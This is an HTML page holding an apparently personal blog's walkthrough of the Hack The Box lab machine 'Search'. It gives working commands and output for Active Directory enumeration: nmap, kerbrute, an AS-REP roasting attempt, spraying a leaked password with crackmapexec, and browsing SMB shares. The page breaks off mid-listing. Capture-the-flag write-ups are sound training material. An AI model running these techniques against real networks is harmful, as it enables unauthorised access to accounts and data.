<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	18 Dec 2021IP:	10.10.11.129">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[search]">
<meta property="og:url" content="https://fdlucifer.github.io/2022/01/08/search/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	18 Dec 2021IP:	10.10.11.129">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search1.png">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search4.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search5.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search6.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search7.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search8.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search9.jpg">
<meta property="article:published_time" content="2022-01-07T16:15:22.000Z">
<meta property="article:modified_time" content="2022-05-01T03:27:27.592Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search1.png">


<link rel="canonical" href="https://fdlucifer.github.io/2022/01/08/search/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/01/08/search/","path":"2022/01/08/search/","title":"Hack-The-Box-walkthrough[search]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[search] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">49</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">210</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">4.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">210</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">49</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/01/08/search/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[search] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[search]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-01-08 00:15:22" itemprop="dateCreated datePublished" datetime="2022-01-08T00:15:22+08:00">2022-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-01 11:27:27" itemprop="dateModified" datetime="2022-05-01T11:27:27+08:00">2022-05-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>3.4k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>12 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Windows<br>Difficulty:	Hard<br>Points:	40<br>Release:	18 Dec 2021<br>IP:	10.10.11.129</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search1.png"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.129</span></span><br><span class="line">PORT      STATE SERVICE           VERSION</span><br><span class="line">53/tcp    open  domain            Simple DNS Plus</span><br><span class="line">80/tcp    open  http              Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-01-07 16:21:36Z)</span><br><span class="line">135/tcp   open  msrpc             Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  ssl/http          Microsoft IIS httpd 10.0</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  globalcatLDAPssl?</span><br><span class="line">8172/tcp  open  ssl/http          Microsoft IIS httpd 10.0</span><br><span class="line">9389/tcp  open  mc-nmf            .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc             Microsoft Windows RPC</span><br><span class="line">49669/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49670/tcp open  msrpc             Microsoft Windows RPC</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49704/tcp open  msrpc             Microsoft Windows RPC</span><br><span class="line">49725/tcp open  msrpc             Microsoft Windows RPC</span><br><span class="line">Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>Nmap reveals a lot of open ports, most of them are Windows based ports. Add the domain to hosts file. Let’s look into web first.</p>
<p>Nothing much available on the web other than team members name. Let’s add these name to a file and enumerate valid usernames.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># /root/kerbrute-master/kerbrute userenum user.txt -d search.htb --dc search.htb </span></span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (n/a) - 01/07/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/01/07 11:31:26 &gt;  Using KDC(s):</span><br><span class="line">2022/01/07 11:31:26 &gt;   search.htb:88</span><br><span class="line"></span><br><span class="line">2022/01/07 11:31:26 &gt;  [+] VALID USERNAME:       Dax.Santiago@search.htb</span><br><span class="line">2022/01/07 11:31:26 &gt;  [+] VALID USERNAME:       Keely.Lyons@search.htb</span><br><span class="line">2022/01/07 11:31:26 &gt;  [+] VALID USERNAME:       Sierra.Frye@search.htb</span><br><span class="line">2022/01/07 11:31:26 &gt;  Done! Tested 8 usernames (3 valid) <span class="keyword">in</span> 0.235 seconds</span><br></pre></td></tr></table></figure>

<p>Out of eight users only three are valid. Let’s Try to query the domain for users with ‘Do not require Kerberos pre-authentication’ set and export their TGTs for cracking.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># GetNPUsers.py search.htb/ -usersfile user.txt</span></span><br><span class="line">Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User Keely.Lyons@search.htb doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User Dax.Santiago@search.htb doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User Sierra.Frye@search.htb doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span><br><span class="line"><span class="string">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span><br><span class="line"><span class="string">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span><br><span class="line"><span class="string">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span><br><span class="line"><span class="string">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span><br></pre></td></tr></table></figure>

<p>These accounts have not set to ‘Do not require pre-auth’. This means, we can’t perform Kerberoasting attack, it requires a user with Pre-Authentication enabled. We can’t dump LDAP without a valid password of a user. There’s no any interesting directory’s to look into. However, there’s a image which has interesting information.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://search.htb/images/slide_2.jpg</span><br></pre></td></tr></table></figure>

<p>If we look at the August 17 date, it says ‘Send password to Hope Sharp’ and password is mentioned IsolationIsKey? We have username and password of Hope user. We can perform password spaying on recently found accounts too.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># crackmapexec smb search.htb -u user.txt -p &#x27;IsolationIsKey?&#x27; --shares</span></span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Keely.Lyons@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Dax.Santiago@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Sierra.Frye@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Kyla.Stewart@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Kaiara.Spencer@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Dave.Simpson@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Ben.Thompson@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Chris.Stewart@search.htb:IsolationIsKey? STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>As you can see, this password is not valid for any of the user which we found recently. Let’s try this password with Hope user.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># crackmapexec smb search.htb -u Hope.Sharp -p &#x27;IsolationIsKey?&#x27; --shares</span></span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Hope.Sharp:IsolationIsKey? </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         C$                              Default share</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         helpdesk                        </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>

<p>We have access to couple shared directory’s. Let’s look into them.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># smbclient //search.htb/RedirectedFolders$ -U Hope.Sharp</span></span><br><span class="line">Enter WORKGROUP\Hope.Sharp<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                  Dc        0  Fri Jan  7 11:46:39 2022</span></span><br><span class="line"><span class="string">  ..                                 Dc        0  Fri Jan  7 11:46:39 2022</span></span><br><span class="line"><span class="string">  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020</span></span><br><span class="line"><span class="string">  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020</span></span><br><span class="line"><span class="string">  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020</span></span><br><span class="line"><span class="string">  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020</span></span><br><span class="line"><span class="string">  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020</span></span><br><span class="line"><span class="string">  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020</span></span><br><span class="line"><span class="string">  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020</span></span><br><span class="line"><span class="string">  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020</span></span><br><span class="line"><span class="string">  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020</span></span><br><span class="line"><span class="string">  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020</span></span><br><span class="line"><span class="string">  edgar.jacobs                       Dc        0  Thu Apr  9 